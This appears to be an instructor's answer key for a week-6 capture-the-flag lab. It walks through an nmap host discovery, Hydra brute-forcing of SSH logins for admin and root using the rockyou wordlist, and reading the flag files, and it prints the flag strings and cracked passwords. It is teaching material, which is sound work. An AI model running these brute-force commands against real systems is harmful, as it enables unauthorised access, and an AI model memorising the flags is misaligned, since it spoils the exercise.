# Week 6 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w6_password_cracked_ssh}`)

**Step 1 — Find the target IP:**
```bash
nmap -sn 172.0.0.0/8 2>/dev/null | grep -A1 "Nmap scan"
# or check: docker inspect ssh-target | grep IPAddress
```

**Step 2 — Brute-force SSH with Hydra:**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 4
# Finds: admin:letmein
```

**Step 3 — SSH in and read the flag:**
```bash
ssh admin@<target_ip>
cat /home/admin/user.txt
```

---

## Flag 2 — root.txt (`flag{w6_root_shell_obtained}`)

**Step 1 — Try common passwords against root:**
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip> -t 4
# Finds: root:password123
```

**Step 2 — SSH in as root and read the flag:**
```bash
ssh root@<target_ip>
cat /root/root.txt
```

---

## Teaching Points

- Hydra is the standard tool for SSH brute-force; `-t 4` avoids lockout on rate-limited services
- `letmein` and `password123` appear in virtually every wordlist — weak passwords fall immediately
- PermitRootLogin yes + simple root passwords is a critical misconfiguration
- In a real engagement, both findings warrant a Critical severity in the report
